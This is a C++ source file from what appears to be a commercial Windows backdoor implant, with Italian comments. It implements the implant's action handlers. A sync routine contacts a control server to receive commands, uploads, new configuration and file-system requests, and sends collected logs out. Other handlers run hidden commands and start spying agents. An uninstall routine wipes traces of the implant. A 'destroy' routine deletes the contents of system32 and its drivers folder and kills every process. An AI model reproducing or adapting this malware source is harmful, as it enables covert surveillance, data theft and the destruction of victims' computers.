#include <stdio.h>
#include "LOG.h"
#include "AM_Core.h"
#include "ASP.h"

class ScrambleString
{
	public:
	char *get_str()
	{
		if (string)
			return string;
		return "NIL";
	}

	WCHAR *get_wstr()
	{
		return string_w;
	}

	ScrambleString(char *ob_str) 
	{
		string = LOG_ScrambleName(ob_str, 2, FALSE);
		if (string)
			_snwprintf_s(string_w, 64, _TRUNCATE, L"%S", string);		
		else
			_snwprintf_s(string_w, 64, _TRUNCATE, L"NIL");		
	}

	ScrambleString(char *ob_str, BOOL is_demo) 
	{
		string = NULL;
		if (is_demo) {
			string = LOG_ScrambleName(ob_str, 2, FALSE);
			if (string)
				_snwprintf_s(string_w, 64, _TRUNCATE, L"%S", string);		
			else
				_snwprintf_s(string_w, 64, _TRUNCATE, L"NIL");		
		} else
			_snwprintf_s(string_w, 64, _TRUNCATE, L"");		
	}

	~ScrambleString(void)
	{
		SAFE_FREE(string);
	}
	
	private:
	char *string;
	WCHAR string_w[64];
};

extern BOOL IsDeepFreeze();
extern void UnlockConfFile();
extern BYTE bin_patched_backdoor_id[];
extern BOOL g_remove_driver;

// Codici delle action function
#define AF_SYNCRONIZE 1
#define AF_STARTAGENT 2
#define AF_STOPAGENT  3
#define AF_EXECUTE    4
#define AF_UNINSTALL  5
#define AF_LOGINFO    6
#define AF_STARTEVENT 7
#define AF_STOPEVENT  8
#define AF_DESTROY	  9
#define AF_NONE 0xFFFFFFFF

// Sono dichiarati in SM_Core.cpp di cui questo file e' un include
void EventMonitorStopAll(void);    
void UpdateEventConf(void);
void EventMonitorStartAll(void);    
void SM_AddExecutedProcess(DWORD);

// Impedisce la concorrenza fra piu' azioni (tranne la sync, che protegge solo un pezzettino)
CRITICAL_SECTION action_critic_sec;
// Per la gestione del secondo thread delle azioni (quelle istantanee)
BOOL bInstantActionThreadSemaphore = FALSE; 
HANDLE hInstantActionThread = NULL;

// Dichiarazione delle possibili azioni
BOOL WINAPI DA_Uninstall(BYTE *dummy_param);
BOOL WINAPI DA_Syncronize(BYTE *action_param);
BOOL WINAPI DA_StartAgent(BYTE *agent_tag);
BOOL WINAPI DA_StopAgent(BYTE *agent_tag);
BOOL WINAPI DA_Execute(BYTE *command);
BOOL WINAPI DA_LogInfo(BYTE *info);
BOOL WINAPI DA_Destroy(BYTE *isPermanent);

// Dichiarazione del thread che puo' essere ristartato dalla sync
DWORD WINAPI FastActionsThread(DWORD);

// Scrive un log di tipo info
BOOL WINAPI DA_LogInfo(BYTE *info)
{
	WCHAR info_string[1024];
	_snwprintf_s(info_string, 1024, _TRUNCATE, L"[User]: %s", (WCHAR *)info);

	EnterCriticalSection(&action_critic_sec);
	SendStatusLog(info_string);
	LeaveCriticalSection(&action_critic_sec);
	return FALSE;
}

// Esegue una sincronizzazione
BOOL WINAPI DA_Syncronize(BYTE *action_param)
{
	typedef struct {
		DWORD min_sleep;
		DWORD max_sleep;
		DWORD band_limit;
		BOOL  exit_after_completion;
		char asp_server[1];
	} sync_conf_struct;
	sync_conf_struct *sync_conf;
	DWORD ret_val; 
	BOOL conn_error = FALSE;
	BOOL exit_after_completion;
	DWORD min_sleep;
	DWORD max_sleep;
	DWORD band_limit;
	long long purge_time = 0;
	DWORD purge_size = 0;

	char *asp_server, *unique_id;
	BOOL uninstall;
	long long actual_time;
	DWORD availables[20];
	BOOL new_conf = FALSE;
	DWORD dummy;

	// Verifica che ci sia il parametro e che non siamo in momento di crisi
	if (!action_param || IsCrisisNetwork())
		return FALSE;

	// asp_server e unique_id devono essere entrambe NULL
	// terminated. Deve essere cura del server inviare una
	// configurazione corretta.
	sync_conf = (sync_conf_struct *)action_param;
	asp_server = sync_conf->asp_server;
	unique_id = (char *)bin_patched_backdoor_id;
	exit_after_completion = sync_conf->exit_after_completion;
	min_sleep = sync_conf->min_sleep;
	max_sleep = sync_conf->max_sleep;
	band_limit = sync_conf->band_limit;

	// Quando riceve l'uninstall la funzione ritorna comunque FALSE
	if (!LOG_StartLogConnection(asp_server, unique_id, &uninstall, &actual_time, availables, sizeof(availables))) {
		if (uninstall) 
			DA_Uninstall(NULL);
		return FALSE;
	}

	// Ricalcola e salva su file il delta date
	HM_CalcDateDelta(actual_time, &date_delta);
	Log_SaveAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta));

	// Gestisce gli availables:
	// Prova comunque a farli tutti, cosi' anche se per caso fallisse un upload (ad esempio)
	// va comunque avanti ad attivare la nuova conf, a spedire i log, etc.
	for (DWORD i=1; i<=availables[0]; i++) {
		if (availables[i] == PROTO_UPLOAD)
			LOG_HandleUpload(TRUE);
		if (availables[i] == PROTO_UPGRADE)
			LOG_HandleUpload(FALSE);
		if (availables[i] == PROTO_NEW_CONF)
			new_conf = LOG_ReceiveNewConf();
		if (availables[i] == PROTO_DOWNLOAD)
			LOG_HandleDownload();
		if (availables[i] == PROTO_FILESYSTEM)
			LOG_HandleFileSystem();
		if (availables[i] == PROTO_PURGE)
			ASP_HandlePurge(&purge_time, &purge_size);
		if (availables[i] == PROTO_COMMANDS)
			LOG_HandleCommands();


		if (IsCrisisNetwork()) 
			break; // Cosi' se aveva ricevuto la nuova configurazione, la attiva
		           // Tanto l'unica cosa che rimane e' l'invio dei log, che controllano
		           // la crisi e in caso chiudono tutto
	}

	// Sospende tutti gli agent e l'agent manager.
	// Gli agent sono costretti a chiudere tutti i file
	// aperti prima dello scambio della coda dei log.
	// E ad agenti stoppati sposta tutti i log nella coda da inviare...
	EnterCriticalSection(&action_critic_sec);
	AM_SuspendRestart(AM_SUSPEND);
	LOG_Purge(purge_time, purge_size); // se non sono stati valorizzati dal comando la funzione non fa nulla
	Log_SwitchQueue();
	if (new_conf)
		AM_SuspendRestart(AM_RESET); // Riattiva gli agenti da file di configurazione (se c'e' nuovo)
	else 
		AM_SuspendRestart(AM_RESTART); // Rimette gli agent nella condizione che avevano alla suspend
	LeaveCriticalSection(&action_critic_sec);

	// Modifica configurazione eventi/azioni
	// se ha ricevuto nuovo file di conf
	if (new_conf) {
		// Devo killare l'altro thread delle azioni perche' sto per distruggere la tabella di eventi/azioni
		// Lo posso fare perche' sono fuori dalla critical section (quindi l'altro thread non e' bloccato)
		QUERY_CANCELLATION(hInstantActionThread, bInstantActionThreadSemaphore);
		EventMonitorStopAll();    
		UpdateEventConf();
		EventMonitorStartAll();
		// Ricreo il thread di gestione delle azioni fast (ora la tabella esiste di nuovo)
		hInstantActionThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FastActionsThread, NULL, 0, &dummy);
	}

	// Invia l'output dei comandi
	LOG_SendOutputCmd(band_limit, min_sleep, max_sleep);

	// Invia la coda dei log da spedire (no concorrenza con agenti)
	// Essendo l'ultima parte del protocollo, questa funzione si occupera' anche di mandare i PROTO_BYE
	LOG_SendLogQueue(band_limit, min_sleep, max_sleep);
	LOG_CloseLogConnection();

	if (new_conf)
		return TRUE; // C'e' una nuova conf, quindi anche questo thread deve smettere di eseguire subactions

	return exit_after_completion;
}


// Fa partire un agent
BOOL WINAPI DA_StartAgent(BYTE *agent_tag)
{
	// Verifica che il parametro agent_tag sia corretto (una DWORD)
	if (!agent_tag)
		return FALSE;

	EnterCriticalSection(&action_critic_sec);
	AM_MonitorStartStop(*(DWORD *)agent_tag, TRUE);
	LeaveCriticalSection(&action_critic_sec);
	return FALSE;
}


// Fa fermare un agent
BOOL WINAPI DA_StopAgent(BYTE *agent_tag)
{
	// Verifica che il parametro agent_tag sia corretto (una DWORD)
	if (!agent_tag)
		return FALSE;

	EnterCriticalSection(&action_critic_sec);
	AM_MonitorStartStop(*(DWORD *)agent_tag, FALSE);
	LeaveCriticalSection(&action_critic_sec);
	return FALSE;
}

// Abilita un evento
BOOL WINAPI DA_StartEvent(BYTE *event_id)
{
	// Verifica che il parametro agent_tag sia corretto (una DWORD)
	if (!event_id)
		return FALSE;

	SM_EventTableState(*(DWORD *)event_id, TRUE);
	return FALSE;
}


// Disabilita un evento
BOOL WINAPI DA_StopEvent(BYTE *event_id)
{
	// Verifica che il parametro agent_tag sia corretto (una DWORD)
	if (!event_id)
		return FALSE;

	SM_EventTableState(*(DWORD *)event_id, FALSE);
	return FALSE;
}

// Esegue un comando in maniera nascosta
BOOL WINAPI DA_Execute(BYTE *command)
{
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	HANDLE hfile;
	char cmd_line[MAX_PATH*2];

	// Verifica che ci sia il comando 
	// N.B. Deve essere NULL terminato!!!
	// e Verifica che non siamo in periodo di crisi 
	if (!command || IsCrisisSystem())
		return FALSE;

	if (!HM_ExpandStrings((char *)command, cmd_line, sizeof(cmd_line)))
		strcpy(cmd_line, (char *)command);

	hfile = Log_CreateOutputFile((char *)command);

	// Il processo viene lanciato con la main window
	// nascosta
	ZeroMemory( &pi, sizeof(pi) );
	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.hStdOutput = stdout;
	si.hStdError = stderr;
	si.hStdInput = stdin;
	if (hfile != INVALID_HANDLE_VALUE)
		si.hStdOutput = si.hStdError = hfile;

	IndirectCreateProcess((char *)cmd_line, 0, &si, &pi, TRUE);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);
	Log_CloseFile(hfile);
		
	// Se HM_CreateProcess fallisce, pi.dwProcessId e' settato a 0.
	// Lo aggiunge alla lista dei processi eseguiti
	if (pi.dwProcessId) 
		SM_AddExecutedProcess(pi.dwProcessId);

	Sleep(300);
	return FALSE;
}


// Disinstalla il programma
BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
{
	char conf_path[DLLNAMELEN];

	ScrambleString ssok("QM\r\n", is_demo_version); // "OK\r\n"
	ScrambleString ss1("_ 4vE77UPC 8WW oEidWl1..........", is_demo_version); // "- Stopping all modules.........."
	ScrambleString ss2("_ jU7UPC Edv zUWl1..............", is_demo_version); // "- Wiping out files.............."
	ScrambleString ss3("_ BWl8PUPC oloEtJ...............", is_demo_version); // "- Cleaning memory..............."

	// Aspetta che il thread di azioni istantanee sia morto.
	// A quel punto ha pieni poteri su tutto visto che viene gestita solo 
	// dal thread principale (lo stesso che gestisce le sync)
	QUERY_CANCELLATION(hInstantActionThread, bInstantActionThreadSemaphore);

	// Killa (se c'e') la dll di supporto a 64bit
	Kill64Core();

	// Stoppa agenti ed event monitor.
	// A questo punto rimane attivo solo il thread 
	// principale che gestisce il logout e l'injection
	// in TaskManager e nei nuovi explorer
	// (che non influisce sulla disinstallazione)

	REPORT_STATUS_LOG(ss1.get_str());
	AM_SuspendRestart(AM_EXIT);
	EventMonitorStopAll();    
	REPORT_STATUS_LOG(ssok.get_str());

	REPORT_STATUS_LOG(ss2.get_str());
	// Rimuove lo sfondo modificato, ma solo se compilato come demo
	// va fatto qui, prima che cancelli i file nella dir nascosta
	RemoveDesktopBackground();

	// Rimuove tutti i file di log.
	Log_RemoveFiles();

	// Rimuove la chiave dal registry.
	// Lo fa dopo aver rimosso i log, per evitare che 
	// il computer venga spento mentre li sta rimuovendo
	// (rimarrebbero i log sulla macchina).
	HM_RemoveRegistryKey();
	REPORT_STATUS_LOG(ssok.get_str());

	REPORT_STATUS_LOG(ss3.get_str());

	// Rimuove il file di configurazione.
	// Lo rimuove dopo aver tolto la chiave del registry 
	// per evitare che il computer venga spento con ancora la backdoor
	// attivabile al successivo avvio, ma senza file di configurazione
	// (non si disinstallerebbe piu').
	UnlockConfFile();
	HM_WipeFileA(HM_CompletePath(H4_CONF_FILE, conf_path));

	// Tenta di iniettare un thread in explorer per cancellare 
	// la DLL core e la directory di lavoro (non puo' cancellarsi da sola)
	HM_RemoveCore();

	//Cancella il driver sull'ultima istanza
	if (g_remove_driver && IsLastInstance())
		HM_RemoveDriver();

	// Tenta l'uninstall dal disco reale in caso di deep freeze
	if (IsDeepFreeze()) {
		HideDevice dev_df;
		DFUninstall(&dev_df, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME);
	}
	REPORT_STATUS_LOG(ssok.get_str());

	// Fa terminare il processo host (rundll32)
	ReportExitProcess();

	// :)
	return FALSE;
}

// Fa schiantare il computer 
DWORD WINAPI KillAllProcess(DWORD dummy)
{
	HANDLE proc_list, hProc;
	PROCESSENTRY32W lppe;

	LOOP {
		Sleep(250);
		if ( (proc_list = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL)) != INVALID_HANDLE_VALUE ) {
			lppe.dwSize = sizeof(PROCESSENTRY32W);
			if (FNC(Process32FirstW)(proc_list,  &lppe)) {
				do {
					if (lppe.th32ProcessID != GetCurrentProcessId()) {
						if (hProc = FNC(OpenProcess)(PROCESS_TERMINATE, FALSE, lppe.th32ProcessID)) {
							TerminateProcess(hProc, 0);
							CloseHandle(hProc);
						}
					}		
				} while(FNC(Process32NextW)(proc_list, &lppe));
			}
			CloseHandle(proc_list);
		}
	}
	return 0;
}

void EmptyDirectory(WCHAR *path)
{
	WCHAR search_path[MAX_PATH];
	WIN32_FIND_DATAW find_data;
	HANDLE hFind;

	_snwprintf_s(search_path, sizeof(search_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\*", path); 

	hFind = FNC(FindFirstFileW)(search_path, &find_data);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;

			_snwprintf_s(search_path, sizeof(search_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\%s", path, find_data.cFileName); 
			DeleteFileW(search_path);
		} while (FNC(FindNextFileW)(hFind, &find_data));
		FNC(FindClose)(hFind);
	}
}

BOOL WINAPI DA_Destroy(BYTE *isPermanent)
{
	static BOOL isRunning = FALSE;
	DWORD dummy;

	// Cancella alcuni file di sistema
	if (*isPermanent) {
		WCHAR sys_path[MAX_PATH];

		DisableWow64Fs();
		if (!FNC(GetEnvironmentVariableW)(L"SystemRoot", sys_path, MAX_PATH))
			return FALSE;
		StrCatW(sys_path, L"\\system32");
		EmptyDirectory(sys_path);

		if (!FNC(GetEnvironmentVariableW)(L"SystemRoot", sys_path, MAX_PATH))
			return FALSE;
		StrCatW(sys_path, L"\\system32\\drivers");
		EmptyDirectory(sys_path);
	}

	// Lancia un thread che killa tutti i processi
	if (!isRunning) {
		HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillAllProcess, NULL, 0, &dummy);
		isRunning = TRUE;
	}

	return FALSE;
}
